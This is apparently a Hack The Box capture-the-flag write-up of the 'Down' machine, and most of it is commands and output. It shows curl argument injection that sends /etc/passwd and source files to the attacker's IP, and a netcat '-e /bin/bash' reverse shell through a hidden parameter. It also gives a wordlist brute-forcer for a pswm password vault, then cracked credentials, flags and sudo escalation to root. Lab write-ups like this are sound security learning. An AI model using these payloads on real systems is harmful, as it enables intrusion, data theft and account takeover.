---
tags:
  - HTB
  - Command-Injection
  - Boot2Root
  - Hacking
  - Pswm
---
# Overview

| Name        | Down      |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap 

```bash
$ sudo nmap -sC -sV 10.129.234.87 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-24 09:59 CST
Nmap scan report for 10.129.234.87
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f6:cc:21:7c:ca:da:ed:34:fd:04:ef:e6:f9:4c:dd:f8 (ECDSA)
|_  256 fa:06:1f:f4:bf:8c:e3:b0:c8:40:21:0d:57:06:dd:11 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Is it down or just me?
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Initial Foothold
## Command Injection

Its basically just using curl. So we can try to send content to our IP.

```bash
curl 'http://down.htb/index.php' \
  --compressed \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://down.htb/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://down.htb' \
  -H 'DNT: 1' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Sec-GPC: 1' \
  -H 'Priority: u=0, i' \
  --data-raw 'url=http%3a//10.10.15.6:8000+--data-urlencode+%40/etc/passwd'
```

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-mymfamqd9n]─[~]
└──╼ [★]$ nc -nlvp 8000
listening on [any] 8000 ...
connect to [10.10.15.6] from (UNKNOWN) [10.129.234.87] 44830
POST / HTTP/1.1
Host: 10.10.15.6:8000
User-Agent: curl/7.81.0
Accept: */*
Content-Length: 2750
Content-Type: application/x-www-form-urlencoded

root%3Ax%3A0%3A0%3Aroot%3A%2Froot%3A%2Fbin%2Fbash%0Adaemon%3Ax%3A1%3A1%3Adaemon%3A%2Fusr%2Fsbin%3A%2Fusr%2Fsbin%2Fnologin%0Abin%3Ax%3A2%3A2%3Abin%3A%2Fbin%3A%2Fusr%2Fsbin%2Fnologin%0Asys%3Ax%3A3%3A3%3Asys%3A%2Fdev%3A%2Fusr%2Fsbin%2Fnologin%0Async%3Ax%3A4%3A65534%3Async%3A%2Fbin%3A%2Fbin%2Fsync%0Agames%3Ax%3A5%3A60%3Agames%3A%2Fusr%2Fgames%3A%2Fusr%2Fsbin%2Fnologin%0Aman%3Ax%3A6%3A12%3Aman%3A%2Fvar%2Fcache%2Fman%3A%2Fusr%2Fsbin%2Fnologin%0Alp%3Ax%3A7%3A7%3Alp%3A%2Fvar%2Fspool%2Flpd%3A%2Fusr%2Fsbin%2Fnologin%0Amail%3Ax%3A8%3A8%3Amail%3A%2Fvar%2Fmail%3A%2Fusr%2Fsbin%2Fnologin%0Anews%3Ax%3A9%3A9%3Anews%3A%2Fvar%2Fspool%2Fnews%3A%2Fusr%2Fsbin%2Fnologin%0Auucp%3Ax%3A10%3A10%3Auucp%3A%2Fvar%2Fspool%2Fuucp%3A%2Fusr%2Fsbin%2Fnologin%0Aproxy%3Ax%3A13%3A13%3Aproxy%3A%2Fbin%3A%2Fusr%2Fsbin%2Fnologin%0Awww-data%3Ax%3A33%3A33%3Awww-data%3A%2Fvar%2Fwww%3A%2Fusr%2Fsbin%2Fnologin%0Abackup%3Ax%3A34%3A34%3Abackup%3A%2Fvar%2Fbackups%3A%2Fusr%2Fsbin%2Fnologin%0Alist%3Ax%3A38%3A38%3AMailing+List+Manager%3A%2Fvar%2Flist%3A%2Fusr%2Fsbin%2Fnologin%0Airc%3Ax%3A39%3A39%3Aircd%3A%2Frun%2Fircd%3A%2Fusr%2Fsbin%2Fnologin%0Agnats%3Ax%3A41%3A41%3AGnats+Bug-Reporting+System+%28admin%29%3A%2Fvar%2Flib%2Fgnats%3A%2Fusr%2Fsbin%2Fnologin%0Anobody%3Ax%3A65534%3A65534%3Anobody%3A%2Fnonexistent%3A%2Fusr%2Fsbin%2Fnologin%0A_apt%3Ax%3A100%3A65534%3A%3A%2Fnonexistent%3A%2Fusr%2Fsbin%2Fnologin%0Asystemd-network%3Ax%3A101%3A102%3Asystemd+Network+Management%2C%2C%2C%3A%2Frun%2Fsystemd%3A%2Fusr%2Fsbin%2Fnologin%0Asystemd-resolve%3Ax%3A102%3A103%3Asystemd+Resolver%2C%2C%2C%3A%2Frun%2Fsystemd%3A%2Fusr%2Fsbin%2Fnologin%0Amessagebus%3Ax%3A103%3A104%3A%3A%2Fnonexistent%3A%2Fusr%2Fsbin%2Fnologin%0Asystemd-timesync%3Ax%3A104%3A105%3Asystemd+Time+Synchronization%2C%2C%2C%3A%2Frun%2Fsystemd%3A%2Fusr%2Fsbin%2Fnologin%0Apollinate%3Ax%3A105%3A1%3A%3A%2Fvar%2Fcache%2Fpollinate%3A%2Fbin%2Ffalse%0Asshd%3Ax%3A106%3A65534%3A%3A%2Frun%2Fsshd%3A%2Fusr%2Fsbin%2Fnologin%0Asyslog%3Ax%3A107%3A113%3A%3A%2Fhome%2Fsyslog%3A%2Fusr%2Fsbin%2Fnologin%0Auuidd%3Ax%3A108%3A114%3A%3A%2Frun%2Fuuidd%3A%2Fusr%2Fsbin%2Fnologin%0Atcpdump%3Ax%3A109%3A115%3A%3A%2Fnonexistent%3A%2Fusr%2Fsbin%2Fnologin%0Atss%3Ax%3A110%3A116%3ATPM+software+stack%2C%2C%2C%3A%2Fvar%2Flib%2Ftpm%3A%2Fbin%2Ffalse%0Alandscape%3Ax%3A111%3A117%3A%3A%2Fvar%2Flib%2Flandscape%3A%2Fusr%2Fsbin%2Fnologin%0Afwupd-refresh%3Ax%3A112%3A118%3Afwupd-refresh+user%2C%2C%2C%3A%2Frun%2Fsystemd%3A%2Fusr%2Fsbin%2Fnologin%0Ausbmux%3Ax%3A113%3A46%3Ausbmux+daemon%2C%2C%2C%3A%2Fvar%2Flib%2Fusbmux%3A%2Fusr%2Fsbin%2Fnologin%0Aaleks%3Ax%3A1000%3A1000%3AAleks%3A%2Fhome%2Faleks%3A%2Fbin%2Fbash%0Alxd%3Ax%3A999%3A100%3A%3A%2Fvar%2Fsnap%2Flxd%2Fcommon%2Flxd%3A%2Fbin%2Ffalse%0A_laurel%3Ax%3A998%3A998%3A%3A%2Fvar%2Flog%2Flaurel%3A%2Fbin%2Ffalse%0A
```

```bash
curl 'http://down.htb/index.php' \
  --compressed \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://down.htb/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://down.htb' \
  -H 'DNT: 1' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Sec-GPC: 1' \
  -H 'Priority: u=0, i' \
  --data-raw 'url=http%3a//10.10.15.6:8000+--data-urlencode+%40/var/www/html/index.php'
```

```html
<!DOCTYPE+html>
<html+lang="en">
<head>
++++<meta+charset="UTF-8">
++++<meta+name="viewport"+content="width=device-width,+initial-scale=1.0">
++++<title>Is+it+down+or+just+me?</title>
++++<link+rel="stylesheet"+href="style.css">
</head>
<body>

++++<header>
++++++++<img+src="/logo.png"+alt="Logo">
++++++++<h2>Is+it+down+or+just+me?</h2>
++++</header>

++++<div+class="container">

<?php
if+(+isset($_GET['expertmode'])+&&+$_GET['expertmode']+===+'tcp'+)+{
++echo+'<h1>Is+the+port+refused,+or+is+it+just+you?</h1>
++++++++<form+id="urlForm"+action="index.php?expertmode=tcp"+method="POST">
++++++++++++<input+type="text"+id="url"+name="ip"+placeholder="Please+enter+an+IP."+required><br>
++++++++++++<input+type="number"+id="port"+name="port"+placeholder="Please+enter+a+port+number."+required><br>
++++++++++++<button+type="submit">Is+it+refused?</button>
++++++++</form>';
}+else+{
++echo+'<h1>Is+that+website+down,+or+is+it+just+you?</h1>
++++++++<form+id="urlForm"+action="index.php"+method="POST">
++++++++++++<input+type="url"+id="url"+name="url"+placeholder="Please+enter+a+URL."+required><br>
++++++++++++<button+type="submit">Is+it+down?</button>
++++++++</form>';
}

if+(+isset($_GET['expertmode'])+&&+$_GET['expertmode']+===+'tcp'+&&+isset($_POST['ip'])+&&+isset($_POST['port'])+)+{
++$ip+=+trim($_POST['ip']);
++$valid_ip+=+filter_var($ip,+FILTER_VALIDATE_IP);
++$port+=+trim($_POST['port']);
++$port_int+=+intval($port);
++$valid_port+=+filter_var($port_int,+FILTER_VALIDATE_INT);
++if+(+$valid_ip+&&+$valid_port+)+{
++++$rc+=+255;+$output+=+'';
++++$ec+=+escapeshellcmd("/usr/bin/nc+-vz+$ip+$port");
++++exec($ec+.+"+2>&1",$output,$rc);
++++echo+'<div+class="output"+id="outputSection">';
++++if+(+$rc+===+0+)+{
++++++echo+"<font+size=+1>It+is+up.+It's+just+you!+😝</font><br><br>";
++++++echo+'<p+id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
++++}+else+{
++++++echo+"<font+size=+1>It+is+down+for+everyone!+😔</font><br><br>";
++++++echo+'<p+id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
++++}
++}+else+{
++++echo+'<div+class="output"+id="outputSection">';
++++echo+'<font+color=red+size=+1>Please+specify+a+correct+IP+and+a+port+between+1+and+65535.</font>';
++}
}+elseif+(isset($_POST['url']))+{
++$url+=+trim($_POST['url']);
++if+(+preg_match('|^https?://|',$url)+)+{
++++$rc+=+255;+$output+=+'';
++++$ec+=+escapeshellcmd("/usr/bin/curl+-s+$url");
++++exec($ec+.+"+2>&1",$output,$rc);
++++echo+'<div+class="output"+id="outputSection">';
++++if+(+$rc+===+0+)+{
++++++echo+"<font+size=+1>It+is+up.+It's+just+you!+😝</font><br><br>";
++++++echo+'<p+id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
++++}+else+{
++++++echo+"<font+size=+1>It+is+down+for+everyone!+😔</font><br><br>";
++++}
++}+else+{
++++echo+'<div+class="output"+id="outputSection">';
++++echo+'<font+color=red+size=+1>Only+protocols+http+or+https+allowed.</font>';
++}
}
?>

</div>
</div>
<footer>©+2024+isitdownorjustme+LLC</footer>
</body>
</html>
```

```php
$url = trim($_POST['url']);  
if ( preg_match('|^https?://|',$url) ) {  
$rc = 255; $output = '';  
$ec = escapeshellcmd("/usr/bin/curl -s $url");  
exec($ec . " 2>&1",$output,$rc);
```

We can see that our input is being passed into “escapeshellcmd()”. From the [official PHP documentation](https://www.php.net/manual/en/function.escapeshellcmd.php), we learn that:

> escapeshellcmd() escapes any characters in a string that might be used to trick a shell command into executing arbitrary commands.

```php
if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' && isset($_POST['ip']) && isset($_POST['port']) ) {  
$ip = trim($_POST['ip']);  
$valid_ip = filter_var($ip, FILTER_VALIDATE_IP);  
$port = trim($_POST['port']);  
$port_int = intval($port);  
$valid_port = filter_var($port_int, FILTER_VALIDATE_INT);  
if ( $valid_ip && $valid_port ) {  
$rc = 255; $output = '';  
$ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");  
exec($ec . " 2>&1",$output,$rc);
```

We can see that there is a hidden functionality within this page. If we supply the following parameter in the URL In this case, the command that will be executed is :  `/usr/bin/nc -vz <IP> <PORT>` The same escapeshellcmd() is used to sanitize the input here, so once again we can only inject arguments.

Luckily, there is an argument within “nc” that will result in a shell , and that’s the -e argument.

We can get a reverse shell with the following parameters:

```bash
ip=<your kali ip>  
port=<port> -e /bin/bash
```

```bash
curl 'http://down.htb/index.php?expertmode=tcp' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://down.htb/?expertmode=tcp' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://down.htb' \
  -H 'DNT: 1' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Sec-GPC: 1' \
  -H 'Priority: u=0, i' \
  --data-raw 'ip=10.10.15.6&port=4444%20-e%20/bin/bash'
```

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-mymfamqd9n]─[~]
└──╼ [★]$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.15.6] from (UNKNOWN) [10.129.234.87] 45820
ls
index.php
logo.png
style.css
user_aeT1xa.txt
cat user_aeT1xa.txt
d4bc94b386ef7c8113698a8c4951cacd
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@down:/var/www/html$ 
```
# Privilege Escalation

```bash
www-data@down:/var/www/html$ ls /home/aleks/.local/share
ls /home/aleks/.local/share
pswm
```

This is the [pswm password manager by “Julynx”](https://github.com/Julynx/pswm).

This is a simple password manager built with python.

From the github page, we learn that:

> When running pswm for the first time, you will be prompted to define a master password that will be used to encrypt your other passwords.

So, we understand that our goal is to crack the master password, decrypt the file, and extract passwords from it.

Luckily, [there is already a tool out there that does that automatically](https://github.com/repo4Chu/pswm-decoder/tree/main).

All we have to do is to supply the path to the PSWM file, and choose a wordlist.

I’ll attempt to run the tool with the “Rockyou.txt” list of passwords:

```bash
$ cat /home/aleks/.local/share/pswm/pswm
e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
```

```python
import cryptocode

PASS_VAULT_FILE = '.local/share/pswm/pswm'
WORDLIST_PATH = '/usr/share/wordlists/rockyou.txt'

def get_encrypted_vault():
    with open(PASS_VAULT_FILE, 'r') as file:
        return file.read()

def try_password(password, encrypted_text):
    decrypted_text = cryptocode.decrypt(encrypted_text, password)
    if decrypted_text:
        print(f"Password: {password}")
        print(f"Decoded text:\n{decrypted_text}")
        return True
    return False

def brute_force_with_wordlist():
    encrypted_text = get_encrypted_vault()
    with open(WORDLIST_PATH, 'r', encoding='utf-8', errors='ignore') as file:
        for line in file:
            password = line.strip()
            if try_password(password, encrypted_text):
                return
    print("not found.")
brute_force_with_wordlist()
```

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-mymfamqd9n]─[~]
└──╼ [★]$ python3 main.py
Password: flower
Decoded text:
pswm	aleks	flower
aleks@down	aleks	1uY3w22uc-Wr{xNHR~+E
```

```bash
www-data@down:/home/aleks/.local/share/pswm$ su aleks
su aleks
Password: 1uY3w22uc-Wr{xNHR~+E

aleks@down:~/.local/share/pswm$ sudo -l
sudo -l
[sudo] password for aleks: 1uY3w22uc-Wr{xNHR~+E

Matching Defaults entries for aleks on down:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User aleks may run the following commands on down:
    (ALL : ALL) ALL
aleks@down:~/.local/share/pswm$ sudo su
sudo su
root@down:/home/aleks/.local/share/pswm# cat /root/root.txt
cat /root/root.txt
87bb9869a311b8abb5fb4d3c7248fdcb
```

---